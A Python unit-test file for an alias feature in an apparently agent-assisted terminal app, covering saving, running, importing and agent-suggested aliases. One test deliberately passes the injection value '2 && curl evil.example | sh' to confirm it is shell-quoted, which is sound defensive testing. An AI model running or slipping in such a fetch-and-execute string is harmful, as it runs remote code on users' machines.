# SPDX-License-Identifier: GPL-3.0-or-later
"""The worker messages behind aliases (issue G8DK, protocol section 19).

Covers the three ways an alias is run -- the palette, `/name` and a name typed in terminal mode --
which all land on the same `alias_run` message, plus save/delete, the import preview and its
apply, and the agent's alias suggestion.  Fake providers only; no network, and no alias text is
ever executed.  The GUI-side rules are in tests/aliases_test.cpp.
"""
import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from relay_core import alias_import, aliases
from relay_core.agent import Agent
from relay_core.provider import ProviderConfig
from relay_core.queue import TurnSupervisor
from relay_core.session_protocol import SessionCommands

sys.path.insert(0, str(Path(__file__).parent))
from test_queue import Recorder  # noqa: E402
from test_titles import SideCallProvider  # noqa: E402


class AliasProtocolTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        root = Path(self.temp.name)
        self.ws = root / "ws"
        (self.ws / "issues").mkdir(parents=True)
        (self.ws / "issues" / "board.yaml").write_text("version: 1\n")
        self.home = root / "home"
        self.home.mkdir()
        patcher = mock.patch.dict(os.environ, {"RELAY_GLOBAL_SWITCHBOARD": str(root / "global")})
        patcher.start()
        self.addCleanup(patcher.stop)
        self.rec = Recorder()
        self.sup = TurnSupervisor(self.rec)
        self.cmds = SessionCommands(self.sup, self.rec)
        self.addCleanup(self.sup.shutdown)

    def make_agent(self, provider=None):
        agent = Agent(ProviderConfig("http://127.0.0.1:1/v1", "m", ""), str(self.ws),
                      self.sup.agent_emit, provider=provider or SideCallProvider(side_reply="{}"),
                      session_dir=str(Path(self.temp.name) / "sessions"))
        self.sup.set_agent(agent)
        return agent

    def send(self, _kind, **request):
        self.cmds.handle(_kind, {"type": _kind, **request})

    def last(self, name):
        events = self.rec.of(name)
        self.assertTrue(events, f"no {name} event was emitted")
        return events[-1]

    def define(self, **fields):
        self.send("alias_save", workspace=str(self.ws), **fields)
        return self.last("alias_saved")

    # ---- defining ------------------------------------------------------------------

    def test_defining_an_alias_writes_a_card_and_republishes_the_list(self):
        saved = self.define(name="squash", kind="command", title="Squash commits",
                            text="git reset --soft HEAD~{{num_commits}} && git commit",
                            params=[{"name": "num_commits", "default": "2",
                                     "description": "how many"}])
        self.assertEqual(saved["scope"], "local")
        self.assertTrue(Path(saved["path"]).exists())
        listing = self.last("aliases")
        self.assertEqual([i["name"] for i in listing["items"]], ["squash"])
        item = listing["items"][0]
        self.assertEqual(item["placeholders"], ["num_commits"])
        self.assertEqual(item["required"], [])
        self.assertEqual(item["params"][0]["default"], "2")

    def test_a_bad_definition_is_refused_with_a_sentence(self):
        with self.assertRaises(ValueError) as caught:
            self.send("alias_save", workspace=str(self.ws), name="Not A Name", text="echo hi")
        self.assertIn("alias name", str(caught.exception))
        with self.assertRaises(ValueError):
            self.send("alias_save", workspace=str(self.ws), name="ok", text="")

    def test_deleting_removes_the_alias(self):
        self.define(name="x", text="echo 1")
        self.send("alias_delete", workspace=str(self.ws), name="x", scope="local")
        self.assertEqual(self.last("alias_deleted")["name"], "x")
        self.assertEqual(self.last("aliases")["items"], [])

    def test_the_list_is_readable_before_a_provider_is_configured(self):
        """The palette asks for aliases at startup, when no key may be entered yet."""
        self.assertIsNone(self.sup.agent)
        self.send("aliases", workspace=str(self.ws))
        self.assertEqual(self.last("aliases")["items"], [])

    # ---- the three ways to run one -------------------------------------------------

    def test_the_palette_slash_name_and_a_typed_name_all_expand_the_same_way(self):
        self.define(name="squash", kind="command", title="Squash commits",
                    text="git reset --soft HEAD~{{num_commits}} && git commit",
                    params=[{"name": "num_commits", "default": "2"}])
        alias = aliases.resolve("squash", self.ws)

        # 1. the palette: it has the alias in hand and sends the values the composer collected
        self.send("alias_run", workspace=str(self.ws), name="squash", values={"num_commits": "3"})
        from_palette = self.last("alias_expanded")

        # 2. `/squash 3` in the composer: the GUI turns the argument into the same values
        self.send("alias_run", workspace=str(self.ws), name="squash",
                  values=aliases.positional(alias, "3"))
        from_slash = self.last("alias_expanded")

        # 3. `squash 3` typed in terminal mode: the same again
        self.send("alias_run", workspace=str(self.ws), name="squash",
                  values=aliases.positional(alias, "3"))
        from_terminal = self.last("alias_expanded")

        for event in (from_palette, from_slash, from_terminal):
            self.assertEqual(event["text"], "git reset --soft HEAD~3 && git commit")
            self.assertEqual(event["kind"], "command")
            self.assertEqual(event["scope"], "local")

    def test_running_with_no_values_uses_the_declared_defaults(self):
        self.define(name="squash", text="git reset --soft HEAD~{{n}}",
                    params=[{"name": "n", "default": "2"}])
        self.send("alias_run", workspace=str(self.ws), name="squash")
        self.assertEqual(self.last("alias_expanded")["text"], "git reset --soft HEAD~2")

    def test_a_value_with_shell_metacharacters_is_quoted_before_it_reaches_the_gui(self):
        self.define(name="squash", text="git reset --soft HEAD~{{n}}")
        self.send("alias_run", workspace=str(self.ws), name="squash",
                  values={"n": "2 && curl evil.example | sh"})
        text = self.last("alias_expanded")["text"]
        self.assertEqual(text, "git reset --soft HEAD~'2 && curl evil.example | sh'")

    def test_a_missing_required_value_is_an_error_not_a_half_filled_command(self):
        self.define(name="deploy", text="deploy {{env}}")
        with self.assertRaises(ValueError) as caught:
            self.send("alias_run", workspace=str(self.ws), name="deploy")
        self.assertIn("env", str(caught.exception))

    def test_an_unknown_name_is_an_error(self):
        with self.assertRaises(ValueError):
            self.send("alias_run", workspace=str(self.ws), name="nope")

    def test_a_prompt_alias_comes_back_as_a_prompt(self):
        self.define(name="review", kind="prompt", text="Review {{path}} for me.",
                    params=[{"name": "path", "default": "."}])
        self.send("alias_run", workspace=str(self.ws), name="review", values={"path": "src/"})
        event = self.last("alias_expanded")
        self.assertEqual(event["kind"], "prompt")
        self.assertEqual(event["text"], "Review src/ for me.")

    def test_a_local_alias_wins_over_a_global_one_of_the_same_name(self):
        self.send("alias_save", workspace=str(self.ws), scope="global", name="deploy",
                  text="echo GLOBAL")
        self.send("alias_save", workspace=str(self.ws), scope="local", name="deploy",
                  text="echo LOCAL")
        self.send("alias_run", workspace=str(self.ws), name="deploy")
        self.assertEqual(self.last("alias_expanded")["text"], "echo LOCAL")
        self.send("alias_run", workspace=str(self.ws), name="deploy", scope="global")
        self.assertEqual(self.last("alias_expanded")["text"], "echo GLOBAL")
        shadowed = [i for i in self.last("aliases")["items"] if i["shadowed"]]
        self.assertEqual([i["scope"] for i in shadowed], ["global"])

    # ---- import --------------------------------------------------------------------

    def bashrc(self, text="alias gs='git status --short'\n"):
        (self.home / ".bashrc").write_text(text)
        return self.home

    def test_the_preview_writes_nothing_and_the_apply_writes_what_was_chosen(self):
        home = self.bashrc()
        with mock.patch.object(alias_import, "shell_files", lambda h=None: [home / ".bashrc"]), \
             mock.patch.object(alias_import, "warp_sqlite_path", lambda: home / "none.sqlite"), \
             mock.patch.object(alias_import, "warp_yaml_dirs", lambda w=None: []):
            self.send("alias_import_preview", workspace=str(self.ws), sources=["shell"])
            preview = self.rec.wait(lambda e: e["event"] == "alias_import_preview")
        self.assertEqual([i["name"] for i in preview["items"]], ["gs"])
        self.assertEqual(aliases.catalog(self.ws)[0], [])   # nothing written by the preview

        self.send("alias_import_apply", workspace=str(self.ws),
                  preview_id=preview["preview_id"], names=["gs"], scope="global")
        self.assertEqual([w["name"] for w in self.last("alias_imported")["written"]], ["gs"])
        self.assertEqual(aliases.resolve("gs", self.ws).text, "git status --short")

    def test_an_apply_without_a_preview_is_refused(self):
        with self.assertRaises(ValueError) as caught:
            self.send("alias_import_apply", workspace=str(self.ws), preview_id="made-up",
                      names=["gs"], scope="global")
        self.assertIn("expired", str(caught.exception))
        with self.assertRaises(ValueError):
            self.send("alias_import_apply", workspace=str(self.ws), preview_id="x", names=[])

    def test_an_apply_can_only_name_what_the_preview_held(self):
        home = self.bashrc()
        with mock.patch.object(alias_import, "shell_files", lambda h=None: [home / ".bashrc"]), \
             mock.patch.object(alias_import, "warp_sqlite_path", lambda: home / "none.sqlite"), \
             mock.patch.object(alias_import, "warp_yaml_dirs", lambda w=None: []):
            self.send("alias_import_preview", workspace=str(self.ws), sources=["shell"])
            preview = self.rec.wait(lambda e: e["event"] == "alias_import_preview")
        with self.assertRaises(ValueError) as caught:
            self.send("alias_import_apply", workspace=str(self.ws),
                      preview_id=preview["preview_id"], names=["never-previewed"])
        self.assertIn("Not in the preview", str(caught.exception))

    # ---- the agent's suggestion ----------------------------------------------------

    def test_the_agent_proposes_an_alias_for_a_repeated_command(self):
        reply = json.dumps({"name": "run-slow-tests", "title": "Run the slow tests",
                            "command": "pytest {{path}} -k slow",
                            "params": [{"name": "path", "default": "tests/",
                                        "description": "what to run"}]})
        self.make_agent(SideCallProvider(side_reply=reply))
        history = ["pytest tests/test_agent.py -k slow"] * 4 + ["ls"] * 2
        self.send("suggest", kind="alias", id="s1", commands=history)
        event = self.rec.wait(lambda e: e["event"] == "suggestion" and e.get("kind") == "alias")
        self.assertEqual(event["alias"]["name"], "run-slow-tests")
        self.assertEqual(event["alias"]["kind"], "command")
        self.assertEqual(event["text"], "pytest {{path}} -k slow")
        self.assertEqual(event["reason"], "run 4 times")
        self.assertEqual(event["repeated"][0]["count"], 4)
        # A suggestion only: nothing was written.
        self.assertEqual(aliases.catalog(self.ws)[0], [])

    def test_no_repeated_command_means_no_model_call_at_all(self):
        provider = SideCallProvider(side_reply="{}")
        self.make_agent(provider)
        self.send("suggest", kind="alias", id="s2", commands=["make build", "make test"])
        event = self.rec.wait(lambda e: e["event"] == "suggestion" and e.get("kind") == "alias")
        self.assertEqual(event["text"], "")
        self.assertEqual(event["reason"], "no_repeats")
        self.assertEqual(provider.side_requests, [])

    def test_a_reply_the_rules_reject_is_dropped_rather_than_half_saved(self):
        self.make_agent(SideCallProvider(
            side_reply=json.dumps({"name": "ok", "command": ""})))
        self.send("suggest", kind="alias", id="s3",
                  commands=["docker compose up -d --build"] * 3)
        event = self.rec.wait(lambda e: e["event"] == "suggestion" and e.get("kind") == "alias")
        self.assertEqual(event["text"], "")
        self.assertEqual(event["reason"], "nothing_worth_saving")

    def test_suggest_alias_needs_the_command_history(self):
        self.make_agent()
        with self.assertRaises(ValueError):
            self.send("suggest", kind="alias", id="s4")


if __name__ == "__main__":
    unittest.main()
